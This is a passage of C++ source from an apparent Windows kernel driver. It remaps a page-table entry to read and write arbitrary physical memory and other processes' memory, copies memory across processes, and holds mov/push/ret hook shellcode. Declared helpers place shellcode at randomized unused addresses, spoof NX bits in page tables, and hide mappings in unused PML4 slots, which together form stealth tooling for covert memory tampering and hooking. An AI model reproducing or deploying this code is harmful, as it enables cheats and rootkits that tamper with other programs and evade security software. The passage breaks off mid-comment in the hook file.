   * invalidation for a specific memory address. Uses optimal flushing strategy
   * based on CPU features.
   *
   * @param address Virtual address to flush from caches and TLB
   *
   * @details
   * This function performs the following operations in sequence:
   * 1. **Smart TLB Flushing**:
   *    - If PCID or Global Pages are enabled: Toggles PGE bit to flush global TLB
   * entries
   *    - Otherwise: Reloads CR3 to flush entire TLB (preserves global pages if
   * PGE set)
   * 2. **Cache Invalidation**: Forces all dirty cache lines to memory and
   * invalidates CPU caches
   * 3. **Page-Specific Invalidation**: Removes the specific virtual address from
   * TLB
   *
   * @note This is a heavy operation that flushes ALL processor caches. Use
   * sparingly.
   * @warning Should be called after direct page table modifications to ensure
   * cache coherency
   *
   * @see CR4 control register documentation for PCID and PGE details
   * @see Intel Software Developer Manual Vol 3A, Section 4.10 for TLB management
   */
  void flush_caches(void* address);

  /**
   * @brief Convert a virtual address to its corresponding physical address
   * @param virtual_address The virtual address to translate
   * @return PHYSICAL_ADDRESS structure containing the physical address, or 0 if
   * translation fails
   *
   * Uses the Memory Manager's PTE resolution to perform virtual-to-physical
   * address translation. Returns zero physical address if the page is not present
   * or the PTE is invalid.
   */
  auto virtual_to_physical(void* virtual_address) -> PHYSICAL_ADDRESS;
  /**
   * @brief Retrieve page table entry information for a given virtual address
   * @param va Virtual address to analyze
   * @param cr3 CR3 register value containing the page directory base
   * @return PAGE_INFORMATION structure containing pointers to relevant page table
   * entries
   *
   * Walks the page table hierarchy to locate and return pointers to the PML4E,
   * PDPTE, PDE, and PTE entries for a virtual address. Handles large pages and
   * stops traversal early when encountering non-present entries or large page
   * mappings.
   */
  auto get_page_information(const void* va, const CR3 cr3) -> PAGE_INFORMATION;

  /**
   * @brief Find random unused space within a memory section for shellcode
   * placement
   * @param base Base address of the section to scan
   * @param section_size Total size of the section in bytes
   * @param shell_size Required size for the shellcode
   * @return Pointer to a randomly selected free space, or nullptr if none found
   *
   * Scans for contiguous zero-byte regions large enough to hold shellcode and
   * randomly selects one to avoid predictable placement patterns.
   */
  auto find_unused_space(void* base, uint32_t section_size, size_t shell_size) -> void*;

  /**
   * @brief Locate a specific section within a PE image
   * @param base Base address of the PE image
   * @param size Output parameter for the section's virtual size
   * @param section_name Name of the section to find (e.g., ".text", ".data")
   * @param section_name_len Length of the section name string
   * @return Virtual address of the section, or nullptr if not found
   *
   * Parses PE headers to locate a named section and returns its virtual address
   * and size.
   */
  auto find_section_base(void* base, uint32_t* size, const char* section_name,
                         size_t section_name_len) -> void*;

  /**
   * @brief Modify page table entries to change memory protection attributes
   * @param address Starting virtual address of the memory range
   * @param size Size of the memory range in bytes
   * @param execute_disable Whether to set the Execute Disable (NX) bit
   * @return true if at least one PTE was successfully modified, false otherwise
   *
   * Iterates through pages in the specified range and modifies their PTEs or PDEs
   * to change execution permissions. Handles both regular 4KB pages and 2MB large
   * pages.
   */
  auto spoof_pte_range(const uintptr_t address, const size_t size, const bool execute_disable)
      -> bool;

  /**
   * @brief Calculate virtual address component for PML4 entry index
   * @param pml4_idx PML4 table index (0-511)
   * @return Virtual address bits corresponding to the PML4 index (bits 47-39)
   *
   * Helper function to construct virtual addresses by converting page table
   * indices to their corresponding address bit patterns.
   */
  uintptr_t get_pml4e(uint32_t pml4_idx);

  /**
   * @brief Calculate virtual address component for PDPT entry index
   * @param pdpt_idx PDPT table index (0-511)
   * @return Virtual address bits corresponding to the PDPT index (bits 38-30)
   *
   * Helper function to construct virtual addresses by converting page table
   * indices to their corresponding address bit patterns.
   */
  uintptr_t get_pdpt(uint32_t pdpt_idx);

  /**
   * @brief Calculate virtual address component for PD entry index
   * @param pd_idx PD table index (0-511)
   * @return Virtual address bits corresponding to the PD index (bits 29-21)
   *
   * Helper function to construct virtual addresses by converting page table
   * indices to their corresponding address bit patterns.
   */
  uintptr_t get_pd(uint32_t pd_idx);

  /**
   * @brief Calculate virtual address component for PT entry index
   * @param pt_idx PT table index (0-511)
   * @return Virtual address bits corresponding to the PT index (bits 20-12)
   *
   * Helper function to construct virtual addresses by converting page table
   * indices to their corresponding address bit patterns.
   */
  uintptr_t get_pt(uint32_t pt_idx);

  /**
   * @brief Structure to hold the result of random PML4 index selection
   */
  struct PML4_SELECTION_RESULT {
    uint32_t selected_index;
    uint32_t available_count;
    bool success;
  };

  /**
   * @brief Find and randomly select an available (non-present) PML4 entry
   * @param dir_base Physical address of the page directory base (CR3)
   * @param start_idx Starting PML4 index to search from
   * @param end_idx Ending PML4 index to search to (exclusive)
   * @param seed_data Additional data to use for random seed generation
   * @return PML4_SELECTION_RESULT containing the selected index and metadata
   *
   * Scans the specified range of PML4 entries to find non-present ones,
   * then randomly selects one for allocation. Uses time and process info
   * for entropy in the random selection.
   */
  auto select_random_available_pml4(uintptr_t dir_base, uint32_t start_idx, uint32_t end_idx,
                                    uintptr_t seed_data = 0) -> PML4_SELECTION_RESULT;

  /**
   * @brief Generate randomized address offset within a PML4E's address space
   * @param use_large_page Whether using 2MB large pages or 4KB pages
   * @return Randomized offset to add entropy to the base address
   *
   * Adds randomization at the appropriate page table level:
   * - Large pages (2MB): Randomizes PDPTE selection (bits 30-38, 1GB regions)
   * - Small pages (4KB): Randomizes PDE selection (bits 21-29, 2MB regions)
   */
  auto generate_address_entropy(bool use_large_page) -> uint64_t;

  /**
   * @brief Helper to determine PML4 search range based on address space preference
   * @param use_high_address Whether to use kernel-space (high) or user-space (low) addresses
   * @param start_idx Output parameter for starting index
   * @param end_idx Output parameter for ending index
   * @param space_type Output parameter for descriptive string
   */
  auto get_pml4_search_range(bool use_high_address, uint32_t* start_idx, uint32_t* end_idx,
                             const char** space_type) -> void;

  /**
   * @brief Construct a complete virtual address with randomization
   * @param selected_pml4_index The selected PML4 table index
   * @param use_high_address Whether this is a kernel-space address
   * @param use_large_page Whether using large pages for entropy calculation
   * @return Complete virtual address with base address and entropy
   */
  auto construct_randomized_virtual_address(uint32_t selected_pml4_index, bool use_high_address,
                                            memory_type mem_type) -> uintptr_t;

}  // namespace page_table
```

`driver/mem/phys.cpp`:

```cpp
#pragma once
// https://github.com/SamuelTulach/DirectPageManipulation
#include "../def/globals.hpp"
#include "../utils/intrin.hpp"
#include "../mem/validation.hpp"
namespace physical {
  inline PTE_NEW* main_page_entry;
  inline void* main_virtual_address;

  void* physical_to_virtual(const uintptr_t address) {
    PHYSICAL_ADDRESS physical{};
    physical.QuadPart = address;
    return globals::mm_get_virtual_for_physical(physical);
  }

  NTSTATUS init() {
    PHYSICAL_ADDRESS max_address{};
    max_address.QuadPart = ((ULONG64) ~((ULONG64)0));

    main_virtual_address = globals::mm_allocate_contiguous_memory(PAGE_SIZE, max_address);
    if (!main_virtual_address)
      return STATUS_INSUFFICIENT_RESOURCES;

    globals::memset(main_virtual_address, 0, PAGE_SIZE);

    VIRTUAL_ADDRESS virtual_address{};
    virtual_address.Pointer = main_virtual_address;

    const PTE_CR3 cr3{intrin::readcr3()};

    auto* pml4 = static_cast<PML4E_NEW*>(physical_to_virtual(PFN_TO_PAGE(cr3.Pml4)));
    auto* pml4e = pml4 + virtual_address.Pml4Index;
    if (!pml4e->Present)
      return STATUS_NOT_FOUND;

    auto* pdpt = static_cast<PDPTE_NEW*>(physical_to_virtual(PFN_TO_PAGE(pml4e->Pdpt)));
    auto* pdpte = pdpt + virtual_address.PdptIndex;
    if (!pdpte->Present)
      return STATUS_NOT_FOUND;

    // sanity check 1GB page
    if (pdpte->PageSize)
      return STATUS_INVALID_PARAMETER;

    auto* pd = static_cast<PDE_NEW*>(physical_to_virtual(PFN_TO_PAGE(pdpte->Pd)));
    auto* pde = pd + virtual_address.PdIndex;
    if (!pde->Present)
      return STATUS_NOT_FOUND;

    // sanity check 2MB page
    if (pde->PageSize)
      return STATUS_INVALID_PARAMETER;

    auto* pt = static_cast<PTE_NEW*>(physical_to_virtual(PFN_TO_PAGE(pde->Pt)));
    auto* pte = pt + virtual_address.PtIndex;
    if (!pte->Present)
      return STATUS_NOT_FOUND;

    main_page_entry = pte;

    return STATUS_SUCCESS;
  }

  PVOID overwrite_page(const uintptr_t physical_address) {
    // page boundary checks are done by Read/WriteProcessMemory
    // and page entries are not spread over different pages
    const unsigned long page_offset = physical_address % PAGE_SIZE;
    const uintptr_t page_start_physical = physical_address - page_offset;
    main_page_entry->PageFrame = PAGE_TO_PFN(page_start_physical);

    globals::ke_flush_entire_tb(TRUE, TRUE);  //  ( cr3/cr4 rewrite on all cores )
    globals::ke_invalidate_all_caches();      // ( __wbinvd on all cores )
    globals::ke_flush_single_tb(reinterpret_cast<uintptr_t>(main_virtual_address), 0,
                                1);  // ( __invlpg on all cores )

    return reinterpret_cast<PVOID>(reinterpret_cast<uintptr_t>(main_virtual_address) + page_offset);
  }

  NTSTATUS read_physical_address(const uintptr_t target_address, void* buffer, const size_t size,
                                 bool bypass_validation = false) {
    if (!target_address || !buffer || !size) {
      log("ERROR", "invalid parameters - target_address: 0x%llx, buffer: %p, size: 0x%llx",
          target_address, buffer, size);
      return STATUS_UNSUCCESSFUL;
    }

    if (!validation::is_physical_address_valid(target_address) && !bypass_validation) {
      log("ERROR", "invalid physical address: 0x%llx", target_address);
      return STATUS_UNSUCCESSFUL;
    }
    const auto virtual_address = overwrite_page(target_address);
    if (!validation::is_virtual_address_valid(virtual_address) && !bypass_validation) {
      log("ERROR", "invalid virtual address after overwrite_page: 0x%llx (physical: 0x%llx)",
          virtual_address, target_address);
      return STATUS_UNSUCCESSFUL;
    }
    globals::memcpy(buffer, virtual_address, size);
    // log("SUCCESS", "read 0x%llx bytes from physical 0x%llx (virtual: 0x%llx)", size,
    // target_address,
    //     virtual_address);
    return STATUS_SUCCESS;
  }

  NTSTATUS write_physical_address(const uintptr_t target_address, const void* buffer,
                                  const size_t size, bool bypass_validation = false) {
    if (!target_address || !buffer || !size) {
      log("ERROR", "invalid parameters - target_address: 0x%llx, buffer: %p, size: 0x%llx",
          target_address, buffer, size);
      return STATUS_UNSUCCESSFUL;
    }

    if (!validation::is_physical_address_valid(target_address) && !bypass_validation) {
      log("ERROR", "invalid physical address: 0x%llx", target_address);
      return STATUS_UNSUCCESSFUL;
    }
    const auto virtual_address = overwrite_page(target_address);
    if (!validation::is_virtual_address_valid(virtual_address) && !bypass_validation) {
      log("ERROR", "invalid virtual address after overwrite_page: 0x%llx (physical: 0x%llx)",
          virtual_address, target_address);
      return STATUS_UNSUCCESSFUL;
    }

    globals::memcpy(virtual_address, buffer, size);

    return STATUS_SUCCESS;
  }
#define PAGE_OFFSET_SIZE 12
  static constexpr uintptr_t PMASK = 0xFFFFFFFFFFF000;
  uintptr_t translate_linear_address(uintptr_t directory_table_base,
                                     const uintptr_t virtual_address) {
    directory_table_base &= ~0xf;

    const uintptr_t page_offset = virtual_address & ~(~0ul << PAGE_OFFSET_SIZE);
    const uintptr_t pte = ((virtual_address >> 12) & (0x1ffll));
    const uintptr_t pt = ((virtual_address >> 21) & (0x1ffll));
    const uintptr_t pd = ((virtual_address >> 30) & (0x1ffll));
    const uintptr_t pdp = ((virtual_address >> 39) & (0x1ffll));

    uintptr_t pdpe = 0;
    read_physical_address(directory_table_base + 8 * pdp, &pdpe, sizeof(pdpe));
    if (~pdpe & 1)
      return 0;

    uintptr_t pde = 0;
    read_physical_address((pdpe & PMASK) + 8 * pd, &pde, sizeof(pde));
    if (~pde & 1)
      return 0;

    // 1GB large page, use pde's 12-34 bits
    if (pde & 0x80)
      return (pde & (~0ull << 42 >> 12)) + (virtual_address & ~(~0ull << 30));

    uintptr_t pte_addr = 0;
    read_physical_address((pde & PMASK) + 8 * pt, &pte_addr, sizeof(pte_addr));
    if (~pte_addr & 1)
      return 0;

    // 2MB large page
    if (pte_addr & 0x80)
      return (pte_addr & PMASK) + (virtual_address & ~(~0ull << 21));

    uintptr_t result_address = 0;
    read_physical_address((pte_addr & PMASK) + 8 * pte, &result_address, sizeof(result_address));
    result_address &= PMASK;

    if (!result_address)
      return 0;

    return result_address + page_offset;
  }

  // uintptr_t translate_linear_address(uintptr_t cr3, uintptr_t va) {
  //   const uint32_t maxphyaddr = intrin::get_maxphyaddr();
  //   const uintptr_t phys_mask = ((1ULL << maxphyaddr) - 1) & ~0xFFFULL;

  //  log("SUCCESS", "VA: 0x%llx, CR3: 0x%llx, MAXPHYADDR: %d bits\n", va, cr3, maxphyaddr);

  //  cr3 &= phys_mask;

  //  // extract indices
  //  const uintptr_t pml4_idx = (va >> 39) & 0x1FF;
  //  const uintptr_t pdpt_idx = (va >> 30) & 0x1FF;
  //  const uintptr_t pd_idx = (va >> 21) & 0x1FF;
  //  const uintptr_t pt_idx = (va >> 12) & 0x1FF;
  //  const uintptr_t offset = va & 0xFFF;

  //  log("SUCCESS", "INDICES PML4: %llu, PDPT: %llu, PD: %llu, PT: %llu, Offset: 0x%llx", pml4_idx,
  //      pdpt_idx, pd_idx, pt_idx, offset);

  //  // read PML4E
  //  PML4E_64 pml4e;
  //  uintptr_t pml4e_addr = cr3 + 8 * pml4_idx;
  //  read_physical_address(pml4e_addr, &pml4e, sizeof(pml4e));
  //  log("SUCCESS", "PML4E Addr: 0x%llx, Value: 0x%llx, Present: %d, PFN: 0x%llx", pml4e_addr,
  //  pml4e,
  //      pml4e.Present, pml4e.PageFrameNumber);
  //  if (!pml4e.Present) {
  //    log("ERROR", "PML4E not present\n");
  //    return 0;
  //  }

  //  // read PDPTE
  //  PDPTE_64 pdpte;
  //  uintptr_t pdpt_base = (pml4e.PageFrameNumber << 12);
  //  uintptr_t pdpte_addr = pdpt_base + 8 * pdpt_idx;
  //  read_physical_address(pdpte_addr, &pdpte, sizeof(pdpte));
  //  log("SUCCESS", "PDPTE Addr: 0x%llx, Value: 0x%llx, Present: %d, LargePage: %d, PFN: 0x%llx\n",
  //      pdpte_addr, pdpte, pdpte.Present, pdpte.LargePage, pdpte.PageFrameNumber);
  //  if (!pdpte.Present) {
  //    log("ERROR", "PDPTE not present");
  //    return 0;
  //  }

  //  // check for 1GB page
  //  if (pdpte.LargePage) {
  //    // for 1GB pages: PDPTE.PFN contains bits 51:30 of physical address
  //    //  shift by 12 and mask to align to 1GB boundary
  //    uintptr_t page_base = pdpte.PageFrameNumber << 12;
  //    uintptr_t phys_addr = (page_base & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
  //    log("SUCCESS", "1GB PAGE Base: 0x%llx, Final PA: 0x%llx", page_base & 0x000FFFFFC0000000ULL,
  //        phys_addr);
  //    return phys_addr;
  //  }

  //  // read PDE
  //  PDE_64 pde;
  //  uintptr_t pd_base = (pdpte.PageFrameNumber << 12);
  //  uintptr_t pde_addr = pd_base + 8 * pd_idx;
  //  read_physical_address(pde_addr, &pde, sizeof(pde));
  //  log("SUCCESS", "PDE Addr: 0x%llx, Value : 0x%llx, Present: %d, LargePage: %d, PFN: 0x%llx",
  //      pde_addr, pde, pde.Present, pde.LargePage, pde.PageFrameNumber);
  //  if (!pde.Present) {
  //    log("ERROR", "PDE not present");
  //    return 0;
  //  }

  //  // check for 2MB page
  //  if (pde.LargePage) {
  //    // for 2MB pages: PDE.PFN contains bits 51:21 of physical address
  //    // shift by 12 and mask to align to 2MB boundary
  //    uintptr_t page_base = pde.PageFrameNumber << 12;
  //    uintptr_t phys_addr = (page_base & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
  //    log("SUCCESS", "2MB PAGE Base: 0x%llx, Final PA: 0x%llx", page_base & 0x000FFFFFFFE00000ULL,
  //        phys_addr);
  //    return phys_addr;
  //  }

  //  // read PTE for 4KB page
  //  PTE_64 pte;
  //  uintptr_t pt_base = (pde.PageFrameNumber << 12);
  //  uintptr_t pte_addr = pt_base + 8 * pt_idx;
  //  read_physical_address(pte_addr, &pte, sizeof(pte));
  //  log("SUCCESS", "PTE Addr: 0x%llx, Value: 0x%llx, Present: %d, PFN: 0x%llx", pte_addr, pte,
  //      pte.Present, pte.PageFrameNumber);
  //  if (!pte.Present) {
  //    log("ERROR", "PTE not present");
  //    return 0;
  //  }

  //  // 4KB page
  //  uintptr_t phys_addr = (pte.PageFrameNumber << 12) | offset;
  //  log("SUCCESS", "4KB PAGE Base: 0x%llx, Final PA: 0x%llx\n", pte.PageFrameNumber << 12,
  //      phys_addr);
  //  return phys_addr;
  //}

  uintptr_t get_process_directory_base(const PEPROCESS input_process) {
    const auto* process = reinterpret_cast<const unsigned char*>(input_process);
    const auto dir_base = *reinterpret_cast<const uintptr_t*>(process + 0x28);
    if (!dir_base) {
      const auto user_dir_base = *reinterpret_cast<const uintptr_t*>(process + 0x158);
      return user_dir_base;
    }
    return dir_base;
  }

  uintptr_t get_process_directory_base_user(const PEPROCESS input_process) {
    const auto* process = reinterpret_cast<const unsigned char*>(input_process);

    const auto user_dir_base = *reinterpret_cast<const uintptr_t*>(process + 0x158);
    return user_dir_base;
  }

  NTSTATUS read_process_memory(const PEPROCESS process, const uintptr_t address, void* buffer,
                               const size_t size) {
    if (!process || !address || !buffer || size == 0) {
      log("ERROR", "invalid parameters");
      return STATUS_INVALID_PARAMETER;
    }

    // acquire rundown protection
    if (!NT_SUCCESS(globals::ps_acquire_process_exit_synchronization(process))) {
      log("ERROR", "failed to acquire rundown protection for process 0x%p", process);
      return STATUS_PROCESS_IS_TERMINATING;
    }

    // double-check process is still active
    if (globals::ps_get_process_exit_status(process) != STATUS_PENDING) {
      globals::ps_release_process_exit_synchronization(process);
      log("ERROR", "process 0x%p is terminating", process);
      return STATUS_PROCESS_IS_TERMINATING;
    }

    const auto process_dir_base = get_process_directory_base(process);
    if (!process_dir_base) {
      globals::ps_release_process_exit_synchronization(process);
      log("ERROR", "failed to get directory base for process 0x%p", process);
      return STATUS_NOT_FOUND;
    }

    size_t current_offset = 0;
    size_t total_size = size;
    NTSTATUS final_status = STATUS_SUCCESS;

    while (total_size && NT_SUCCESS(final_status)) {
      const auto current_physical_address =
          translate_linear_address(process_dir_base, address + current_offset);
      if (!current_physical_address) {
        log("ERROR", "failed to translate VA 0x%llx", address + current_offset);
        final_status = STATUS_NOT_FOUND;
        break;
      }

      const auto read_size = min(PAGE_SIZE - (current_physical_address & 0xFFF), total_size);
      const auto status = read_physical_address(
          current_physical_address,
          reinterpret_cast<void*>(reinterpret_cast<uintptr_t>(buffer) + current_offset), read_size);

      if (!NT_SUCCESS(status) || !read_size) {
        final_status = status;
        break;
      }

      total_size -= read_size;
      current_offset += read_size;
    }

    globals::ps_release_process_exit_synchronization(process);

    return final_status;
  }

  NTSTATUS write_process_memory(const PEPROCESS process, const uintptr_t address,
                                const void* buffer, const size_t size) {
    if (!process || !address || !buffer || size == 0) {
      log("ERROR", "invalid parameters");
      return STATUS_INVALID_PARAMETER;
    }

    // acquire rundown protection
    if (!NT_SUCCESS(globals::ps_acquire_process_exit_synchronization(process))) {
      log("ERROR", "failed to acquire rundown protection for process 0x%p", process);
      return STATUS_PROCESS_IS_TERMINATING;
    }

    // double-check process is still active
    if (globals::ps_get_process_exit_status(process) != STATUS_PENDING) {
      globals::ps_release_process_exit_synchronization(process);
      log("ERROR", "process 0x%p is terminating", process);
      return STATUS_PROCESS_IS_TERMINATING;
    }

    const auto process_dir_base = get_process_directory_base(process);
    if (!process_dir_base) {
      globals::ps_release_process_exit_synchronization(process);
      log("ERROR", "failed to get directory base for process 0x%p", process);
      return STATUS_NOT_FOUND;
    }

    size_t current_offset = 0;
    size_t total_size = size;
    NTSTATUS final_status = STATUS_SUCCESS;

    while (total_size && NT_SUCCESS(final_status)) {
      const auto current_physical_address =
          translate_linear_address(process_dir_base, address + current_offset);
      if (!current_physical_address) {
        log("ERROR", "failed to translate VA 0x%llx", address + current_offset);
        final_status = STATUS_NOT_FOUND;
        break;
      }

      const auto write_size = min(PAGE_SIZE - (current_physical_address & 0xFFF), total_size);
      const auto status = write_physical_address(
          current_physical_address,
          reinterpret_cast<PVOID>(reinterpret_cast<uintptr_t>(buffer) + current_offset),
          write_size);

      if (!NT_SUCCESS(status) || !write_size) {
        final_status = status;
        break;
      }

      total_size -= write_size;
      current_offset += write_size;
    }

    globals::ps_release_process_exit_synchronization(process);

    return final_status;
  }

  NTSTATUS copy_memory(const PEPROCESS source_process, const void* source_address,
                       const PEPROCESS target_process, const void* target_address,
                       const size_t buffer_size) {
    void* temp_buffer = globals::mm_allocate_independent_pages_ex(buffer_size, -1, 0, 0);
    if (!temp_buffer)
      return STATUS_INSUFFICIENT_RESOURCES;

    globals::memset(temp_buffer, 0, buffer_size);

    const auto status = read_process_memory(
        source_process, reinterpret_cast<uintptr_t>(source_address), temp_buffer, buffer_size);
    if (NT_SUCCESS(status)) {
      write_process_memory(target_process, reinterpret_cast<uintptr_t>(target_address), temp_buffer,
                           buffer_size);
    }

    globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(temp_buffer), buffer_size);
    return status;
  }

  auto get_page_frame_number(uintptr_t virtual_address, memory_type mem_type) -> uintptr_t {
    PHYSICAL_ADDRESS physical_address =
        globals::mm_get_physical_address(reinterpret_cast<void*>(virtual_address));
    if (!physical_address.QuadPart) {
      return 0;
    }

    // Shift based on page size
    uint32_t shift = (mem_type == memory_type::HUGE_PAGE) ? 30 :  // 1GB = 2^30
                         (mem_type == memory_type::LARGE_PAGE) ? 21
                                                               :  // 2MB = 2^21
                         12;                                      // 4KB = 2^12
    return physical_address.QuadPart >> shift;
  }

}  // namespace physical

```

`driver/mem/phys.hpp`:

```hpp
#pragma once
// https://github.com/SamuelTulach/DirectPageManipulation

namespace physical {
  extern inline PTE_NEW* main_page_entry;
  extern inline void* main_virtual_address;

  void* physical_to_virtual(const uintptr_t address);

  NTSTATUS init();

  PVOID overwrite_page(const uintptr_t physical_address);

  NTSTATUS read_physical_address(const uintptr_t target_address, void* buffer, const size_t size,
                                 bool bypass_validation = false);

  NTSTATUS write_physical_address(const uintptr_t target_address, const void* buffer,
                                  const size_t size, bool bypass_validation = false);

#define PAGE_OFFSET_SIZE 12
  static constexpr uintptr_t PMASK = 0xFFFFFFFFFFF000;
  uintptr_t translate_linear_address(uintptr_t directory_table_base,
                                     const uintptr_t virtual_address);

  /*uintptr_t translate_linear_address(uintptr_t cr3, uintptr_t va) {
    const uint32_t maxphyaddr = intrin::get_maxphyaddr();
    const uintptr_t phys_mask = ((1ULL << maxphyaddr) - 1) & ~0xFFFULL;

    log("SUCCESS", "VA: 0x%llx, CR3: 0x%llx, MAXPHYADDR: %d bits\n", va, cr3, maxphyaddr);

    cr3 &= phys_mask;

     extract indices
    const uintptr_t pml4_idx = (va >> 39) & 0x1FF;
    const uintptr_t pdpt_idx = (va >> 30) & 0x1FF;
    const uintptr_t pd_idx = (va >> 21) & 0x1FF;
    const uintptr_t pt_idx = (va >> 12) & 0x1FF;
    const uintptr_t offset = va & 0xFFF;

    log("SUCCESS", "INDICES PML4: %llu, PDPT: %llu, PD: %llu, PT: %llu, Offset: 0x%llx", pml4_idx,
        pdpt_idx, pd_idx, pt_idx, offset);

     read PML4E
    PML4E_64 pml4e;
    uintptr_t pml4e_addr = cr3 + 8 * pml4_idx;
    read_physical_address(pml4e_addr, &pml4e, sizeof(pml4e));
    log("SUCCESS", "PML4E Addr: 0x%llx, Value: 0x%llx, Present: %d, PFN: 0x%llx", pml4e_addr, pml4e,
        pml4e.Present, pml4e.PageFrameNumber);
    if (!pml4e.Present) {
      log("ERROR", "PML4E not present\n");
      return 0;
    }

     read PDPTE
    PDPTE_64 pdpte;
    uintptr_t pdpt_base = (pml4e.PageFrameNumber << 12);
    uintptr_t pdpte_addr = pdpt_base + 8 * pdpt_idx;
    read_physical_address(pdpte_addr, &pdpte, sizeof(pdpte));
    log("SUCCESS", "PDPTE Addr: 0x%llx, Value: 0x%llx, Present: %d, LargePage: %d, PFN: 0x%llx\n",
        pdpte_addr, pdpte, pdpte.Present, pdpte.LargePage, pdpte.PageFrameNumber);
    if (!pdpte.Present) {
      log("ERROR", "PDPTE not present");
      return 0;
    }

     check for 1GB page
    if (pdpte.LargePage) {
       for 1GB pages: PDPTE.PFN contains bits 51:30 of physical address
       shift by 12 and mask to align to 1GB boundary
      uintptr_t page_base = pdpte.PageFrameNumber << 12;
      uintptr_t phys_addr = (page_base & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
      log("SUCCESS", "1GB PAGE Base: 0x%llx, Final PA: 0x%llx", page_base & 0x000FFFFFC0000000ULL,
          phys_addr);
      return phys_addr;
    }

     read PDE
    PDE_64 pde;
    uintptr_t pd_base = (pdpte.PageFrameNumber << 12);
    uintptr_t pde_addr = pd_base + 8 * pd_idx;
    read_physical_address(pde_addr, &pde, sizeof(pde));
    log("SUCCESS", "PDE Addr: 0x%llx, Value : 0x%llx, Present: %d, LargePage: %d, PFN: 0x%llx",
        pde_addr, pde, pde.Present, pde.LargePage, pde.PageFrameNumber);
    if (!pde.Present) {
      log("ERROR", "PDE not present");
      return 0;
    }

     check for 2MB page
    if (pde.LargePage) {
       for 2MB pages: PDE.PFN contains bits 51:21 of physical address
       shift by 12 and mask to align to 2MB boundary
      uintptr_t page_base = pde.PageFrameNumber << 12;
      uintptr_t phys_addr = (page_base & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
      log("SUCCESS", "2MB PAGE Base: 0x%llx, Final PA: 0x%llx", page_base & 0x000FFFFFFFE00000ULL,
          phys_addr);
      return phys_addr;
    }

     read PTE for 4KB page
    PTE_64 pte;
    uintptr_t pt_base = (pde.PageFrameNumber << 12);
    uintptr_t pte_addr = pt_base + 8 * pt_idx;
    read_physical_address(pte_addr, &pte, sizeof(pte));
    log("SUCCESS", "PTE Addr: 0x%llx, Value: 0x%llx, Present: %d, PFN: 0x%llx", pte_addr, pte,
        pte.Present, pte.PageFrameNumber);
    if (!pte.Present) {
      log("ERROR", "PTE not present");
      return 0;
    }

     4KB page
    uintptr_t phys_addr = (pte.PageFrameNumber << 12) | offset;
    log("SUCCESS", "4KB PAGE Base: 0x%llx, Final PA: 0x%llx\n", pte.PageFrameNumber << 12,
        phys_addr);
    return phys_addr;
  }*/

  uintptr_t get_process_directory_base(const PEPROCESS input_process);

  uintptr_t get_process_directory_base_user(const PEPROCESS input_process);

  NTSTATUS read_process_memory(const PEPROCESS process, const uintptr_t address, void* buffer,
                               const size_t size);

  NTSTATUS write_process_memory(const PEPROCESS process, const uintptr_t address,
                                const void* buffer, const size_t size);

  NTSTATUS copy_memory(const PEPROCESS source_process, const void* source_address,
                       const PEPROCESS target_process, const void* target_address,
                       const size_t buffer_size);

  auto get_page_frame_number(uintptr_t virtual_address, memory_type mem_type) -> uintptr_t;

}  // namespace physical

```

`driver/mem/pt_hook.cpp`:

```cpp
#include "../hde/hde.h"

#pragma warning(push)
#pragma warning(disable : 4706)
#include "../def/globals.hpp"
#include "phys.hpp"
#include "mem.hpp"
namespace pt_hook {

  const uint8_t mov_rax_shellcode[] = {
      0x48, 0xB8,              // mov rax, imm64
      0x00, 0x00, 0x00, 0x00,  // placeholder for lower 32 bits of hook function
      0x00, 0x00, 0x00, 0x00,  // placeholder for upper 32 bits of hook function
      0x50,                    // push rax
      0xC3                     // ret
  };

  struct hook_info {
    uintptr_t target_va;
    uintptr_t target_pa;
    uintptr_t hook_function;
    uintptr_t original_function;
    uint8_t original_bytes[32];
    size_t hook_size;
    bool initialized;
  };
  /**
   * @brief Translate virtual address to physical address using page table walking
   * @param pml4_pa Physical address of the PML4 table (CR3 register value)
   * @param va Virtual address to translate
   * @return Physical address, or 0 if translation fails
   *
   * Manually walks the page table hierarchy (PML4->PDPT->PD->PT) to perform
   * virtual-to-physical address translation. Supports 4KB pages, 2MB large pages,
   * and 1GB huge pages with proper detection at each level.
   */
  auto virt_to_phys_via_pml4(uintptr_t pml4_pa, uintptr_t va) -> uintptr_t {
    ADDRESS_TRANSLATION_HELPER addr_helper = {0};
    addr_helper.AsUInt64 = va;

    // read PML4E
    PML4E_64 pml4e = {0};
    if (!NT_SUCCESS(physical::read_physical_address(pml4_pa + addr_helper.AsIndex.Pml4 * 8, &pml4e,
                                                    sizeof(pml4e)))) {
      return 0;
    }
    if (!pml4e.Present)
      return 0;

    // read PDPTE
    PDPTE_64 pdpte = {0};
    uintptr_t pdpt_pa = PFN_TO_PAGE(pml4e.PageFrameNumber);
    if (!NT_SUCCESS(physical::read_physical_address(pdpt_pa + addr_helper.AsIndex.Pdpt * 8, &pdpte,
                                                    sizeof(pdpte)))) {
      return 0;
    }
    if (!pdpte.Present)
      return 0;

    // check for 1GB huge page at PDPT level
    if (pdpte.LargePage) {
      return PFN_TO_PAGE(pdpte.PageFrameNumber) + addr_helper.AsPageOffset.Mapping1Gb;
    }

    // read PDE
    PDE_64 pde = {0};
    uintptr_t pd_pa = PFN_TO_PAGE(pdpte.PageFrameNumber);
    if (!NT_SUCCESS(physical::read_physical_address(pd_pa + addr_helper.AsIndex.Pd * 8, &pde,
                                                    sizeof(pde)))) {
      return 0;
    }
    if (!pde.Present)
      return 0;

    // check for 2MB large page at PD level
    if (pde.LargePage) {
      return PFN_TO_PAGE(pde.PageFrameNumber) + addr_helper.AsPageOffset.Mapping2Mb;
    }

    // read PTE for 4KB page
    PTE_64 pte = {0};
    uintptr_t pt_pa = PFN_TO_PAGE(pde.PageFrameNumber);
    if (!NT_SUCCESS(physical::read_physical_address(pt_pa + addr_helper.AsIndex.Pt * 8, &pte,
                                                    sizeof(pte)))) {
      return 0;
    }
    if (!pte.Present)
      return 0;

    // 4KB page
    return PFN_TO_PAGE(pte.PageFrameNumber) + addr_helper.AsPageOffset.Mapping4Kb;
  }

  /**
   * @brief Calculate the minimum number of bytes needed for hook installation
   * @param target_pa Physical address of the target function
   * @param min_size Minimum required size for the hook (default: 12 bytes)
   * @return Total size in bytes, or 0 if disassembly fails
   *
